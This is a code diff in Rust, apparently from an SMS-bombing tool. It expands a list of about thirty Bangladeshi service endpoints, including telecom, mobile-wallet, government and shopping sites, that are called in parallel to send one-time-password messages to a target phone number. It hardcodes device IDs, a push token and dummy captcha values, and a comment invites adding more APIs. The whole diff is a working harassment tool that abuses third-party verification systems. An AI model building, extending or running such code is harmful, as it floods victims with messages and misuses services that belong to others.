@@ -116,54 +116,124 @@ pub async fn handle(mut req: Request, _env: &Env) -> Result<Response> {
     // ═══════════════════════════════════════════════
     let api_results = parallel![
         // ── BD SMS APIs ──
-        fire("Shadhin Music",
-            "https://coreapi.shadhinmusic.com/api/v5/otp/OtpRobiReq",
-            json!({"msisdn": &bd_full, "shortcode": 16235, "servicename": "Shadhin Music"})
-        ),
-        fire("Khaodao",
-            "https://api.eat-z.com/auth/customer/app-connect",
-            json!({"username": &plus_bd})
-        ),
-        fire("Walton Plaza",
-            "https://waltonplaza.com.bd/api/auth/otp/create",
-            json!({"auth": {"countryCode": "880", "phone": &bd_no}, "captchaToken": "recapcha"})
-        ),
-        fire("Easy.com.bd",
-            "https://core.easy.com.bd/api/v1/forgot-password-otp",
-            json!({"device_key": "2ea97d276a980993308116baa292cec9", "mobile": &number})
-        ),
-        fire("Chaldal",
-            "https://chaldal.com/api/OTP/GenerateOTP",
-            json!({"phoneNumber": &plus_bd})
-        ),
-        fire("Shajgoj",
-            "https://shajgoj.com/wp-json/cocart/v1/customer/otp",
-            json!({"phone": &number, "type": "login"})
-        ),
-        fire("Bkash",
-            "https://www.bkash.com/api/get-otp",
-            json!({"mobile": &number})
-        ),
-        fire("Nagad",
-            "https://api.mynagad.com/api/dfs/check-account",
-            json!({"accountNumber": &bd_full})
-        ),
-        fire("Pathao Food",
-            "https://pathao.com/api/v1/auth/otp",
-            json!({"phone": &number, "country_code": "+880"})
-        ),
-        fire("Shohoz",
-            "https://shohoz.com/api/v4.0/user/sendOTP",
-            json!({"mobile_no": &number})
-        ),
-        fire("Daraz",
-            "https://member.daraz.com.bd/user/api/v1/otp/sendOtp",
-            json!({"mobile": &bd_full, "countryCode": "880", "action": "REGISTER"})
-        ),
-        fire("Sheba.xyz",
-            "https://sheba.xyz/api/v2/auth/otp",
-            json!({"mobile": &number})
-        ),
+       fire("Shadhin Music",
+    "https://coreapi.shadhinmusic.com/api/v5/otp/OtpRobiReq",
+    json!({"msisdn": &bd_full, "shortcode": 16235, "servicename": "Shadhin Music"})
+),
+fire("Khaodao",
+    "https://api.eat-z.com/auth/customer/app-connect",
+    json!({"username": &plus_bd})
+),
+fire("Walton Plaza",
+    "https://waltonplaza.com.bd/api/auth/otp/create",
+    json!({"auth": {"countryCode": "880", "deviceUuid": "ee757830-f639-12f0-9f4d-2f972746fhg", "phone": &bd_no}, "captchaToken": "recapcha"})
+),
+fire("Apex4u",
+    "https://api.apex4u.com/api/auth/login",
+    json!({"phoneNumber": &number})
+),
+fire("Easy.com.bd",
+    "https://core.easy.com.bd/api/v1/forgot-password-otp",
+    json!({"device_key": "2ea97d276a980993308116baa292cec9", "mobile": &number})
+),
+fire("Chardike",
+    "https://api.chardike.com/api/otp/send",
+    json!({"phone": &number, "otp_type": "login"})
+),
+fire("BTCL",
+    "https://mybtcl.btcl.gov.bd/api/ecare/anonym/sendOTP.json",
+    json!({"phoneNbr": &number, "OTPType": 1, "userName": "", "email": ""})
+),
+fire("AWS POC",
+    "https://8t09wa0n0a.execute-api.ap-south-1.amazonaws.com/poc/api/v1/otp/send",
+    json!({"phone": &number})
+),
+fire("Otithee",
+    "https://gateway.otithee.com/api/v1/generate-otp",
+    json!({"request_type": "registration", "mobile_number": &number})
+),
+fire("Quizgiri",
+    "https://developer.quizgiri.xyz/api/v2.0/send-otp",
+    json!({"country_code": "+88", "phone": &number})
+),
+fire("Mojaru",
+    "https://new.mojaru.com/api/student/login",
+    json!({"mobile_or_email": &number})
+),
+fire("GP MyGP",
+    "https://appcity.grameenphone.com/proxy/v2/user/session/get-otp",
+    json!({"mobileNumber": &number})
+),
+fire("Garibook",
+    "https://api.garibookadmin.com/api/v3/user/login",
+    json!({"recaptcha_token": "garibookcaptcha", "mobile": &number, "channel": "web"})
+),
+fire("Bioscope Live",
+    "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en",
+    json!({"number": &plus_bd})
+),
+fire("Upay",
+    "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/",
+    json!({"wallet_number": &number, "geo_location": {"lat": 23.8979093, "long": 89.1356346}, "referral": "", "firebase_token": "e7XC0AWRR5C6rGMm6yCaZ8:APA91bHnbvs1bA_qXXb55W9GmsKmuzAUkgaR770HBH9hZCLjFV6HCejAsRGggvnD7c5dv2q_pOAdwY1peeTlzzn49cjPESTZ0NdR-bIhwe9_6of6rosH0AI", "device_uuid": "c65m117a8cbf5b1851b29f8b", "mno": "Robi"})
+),
+fire("Chorki",
+    "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en",
+    json!({"number": &plus_bd})
+),
+fire("Deepto Play",
+    "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en",
+    json!({"number": &plus_bd})
+),
+fire("RedX",
+    "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp",
+    json!({"phoneNumber": &number})
+),
+fire("Bohubrihi",
+    "https://bb-api.bohubrihi.com/public/activity/otp",
+    json!({"phone": &number, "intent": "login"})
+),
+fire("Timezone BD",
+    "https://backend.timezonebd.com/api/v1/user/otp-login",
+    json!({"phone": &number})
+),
+fire("GP Shop",
+    "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp",
+    json!({"phone": &number, "language": "en", "email": ""})
+),
+fire("Shikho",
+    "https://api.shikho.com/public/activity/otp",
+    json!({"phone": &number, "intent": "ap-discount-request"})
+),
+fire("Ghoori Learning",
+    "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web&_lang=bn",
+    json!({"mobile_no": &number})
+),
+fire("Ostad",
+    "https://api.ostad.app/api/v2/user/with-otp",
+    json!({"msisdn": &number})
+),
+fire("iEducation BD",
+    "https://www.ieducationbd.com/api/account/check_user",
+    json!({"mobile": &number})
+),
+fire("Nexopet",
+    "https://host03pet.nexopet.com/api/v1.0/users/send-otp",
+    json!({"phone": &number})
+),
+fire("Bikroy",
+    "https://bikroy.com/data/phone_number_login/verifications/phone_login",
+    json!({"phone": &number})
+),
+fire("Bangladeshi Matrimony",
+    "https://www.bangladeshimatrimony.com/register/editmobileno.php",
+    json!({"mobileNo": &number})
+),
+fire("Edge Course BD",
+    "https://edgecoursebd.com/register",
+    json!({"phone": &number})
+),
+
+            
         // ── এখানে নতুন API যোগ করো ──
         // fire("API নাম", "https://api.url", json!({"phone": &number})),
         // fire("API নাম", "https://api.url", json!({"mobile": &bd_full})),
